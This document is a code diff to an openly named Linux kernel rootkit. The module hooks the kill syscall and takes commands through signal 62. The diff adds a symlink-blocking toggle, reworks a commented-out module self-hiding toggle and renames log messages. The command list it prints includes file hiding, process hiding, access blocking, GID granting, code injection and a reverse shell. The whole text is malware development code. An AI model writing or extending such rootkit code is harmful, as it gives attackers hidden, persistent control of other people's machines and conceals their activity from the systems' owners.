@@ -29,9 +29,12 @@
 extern int  blocking_init(void);
 extern void blocking_exit(void);
 extern bool blocking_active;
+extern bool slink_block_active;
+
 /*
 extern void hide_module(void);
 extern void show_module(void);
+extern bool module_hidden;
 */
 
 /* Deferred injection (can't call vm_mmap from kprobe context) */
@@ -105,28 +108,34 @@ static void toggle_work_fn(struct work_struct *w)
 	case CMD_TOGGLE_HIDE:
 		if (file_hide_is_active()) {
 			file_hide_disable();
-			pr_info("[rootkit] file hiding OFF\n");
+			pr_info("[C2] file hiding OFF\n");
 		} else {
 			file_hide_enable();
-			pr_info("[rootkit] file hiding ON\n");
+			pr_info("[C2] file hiding ON\n");
 		}
 		break;
 	case CMD_TOGGLE_PROC:
 		if (proc_hide_is_active()) {
 			proc_hide_disable();
-			pr_info("[rootkit] process hiding OFF\n");
+			pr_info("[C2] process hiding OFF\n");
 		} else {
 			proc_hide_enable();
-			pr_info("[rootkit] process hiding ON\n");
+			pr_info("[C2] process hiding ON\n");
 		}
 		break;
-  /*
+	/*
 	case CMD_TOGGLE_MODULE:
-		show_module();
-		pr_info("[rootkit] module unhidden\n");
+		if (module_hidden) {
+		  show_module();
+		  pr_info("[C2] rootkit module restored");
+		} else {
+		  hide_module();
+		  pr_info("[C2] rootkit module hidden");
+		}
 		break;
-  */
+	*/
 	}
+
 	kfree(tw);
 }
 
@@ -177,15 +186,17 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
     case CMD_STATUS:
       pr_info("[rootkit][status] Current state log:");
       status = file_hide_is_active();
-      pr_info("[rootkit][status]    File hiding----------> %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    File hiding----------+ %s\n", status ? "ENABLED" : "DISABLED");
       status = blocking_active;
-      pr_info("[rootkit][status]    File blocking--------> %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    File blocking--------+ %s\n", status ? "ENABLED" : "DISABLED");
+      status = slink_block_active;
+      pr_info("[rootkit][status]    Symlink blocking-----+ %s\n", status ? "ENABLED" : "DISABLED");
       /*
       status = module_hidden;
-      pr_info("[rootkit][status]    Module self-hiding---> %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    Module self-hiding---+ %s\n", status ? "ENABLED" : "DISABLED");
       */
       status = proc_hide_is_active();
-      pr_info("[rootkit][status]    Process hiding-------> %s\n", status ? "ENABLED" : "DISABLED");
+      pr_info("[rootkit][status]    Process hiding-------+ %s\n", status ? "ENABLED" : "DISABLED");
       break;
     case CMD_TOGGLE_HIDE:
       schedule_toggle(CMD_TOGGLE_HIDE);
@@ -193,11 +204,14 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
     case CMD_TOGGLE_BLOCK:
       blocking_active = !blocking_active;
       break;
-    /*
+    case CMD_TOGGLE_SLINK:
+      slink_block_active = !slink_block_active;
+      break;
+      /*
     case CMD_TOGGLE_MODULE:
       schedule_toggle(CMD_TOGGLE_MODULE);
       break;
-    */
+      */
     case CMD_TOGGLE_PROC:
       schedule_toggle(CMD_TOGGLE_PROC);
       break;
@@ -214,13 +228,14 @@ static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
       pr_warn("[C2][WARNING] unknown command %d\n", cmd);
       pr_info("[C2] usage: kill -62 <cmd>\n");
       pr_info("[C2]   0 - status\n");
-      pr_info("[C2]   1 - file hiding\n");
-      pr_info("[C2]   2 - access blocking\n");
-      pr_info("[C2]   3 - unhide module (not implemented yet)\n");
-      pr_info("[C2]   4 - proc hiding\n");
+      pr_info("[C2]   1 - toggle file hiding\n");
+      pr_info("[C2]   2 - toogle access blocking\n");
+      pr_info("[C2]   3 - toggle module hiding (not working)\n");
+      pr_info("[C2]   4 - toggle process hiding\n");
       pr_info("[C2]   5 - add GID\n");
       pr_info("[C2]   6 - inject\n");
       pr_info("[C2]   7 - revshell\n");
+      pr_info("[C2]   8 - toggle symlink blocking\n");
       break;
   }
 
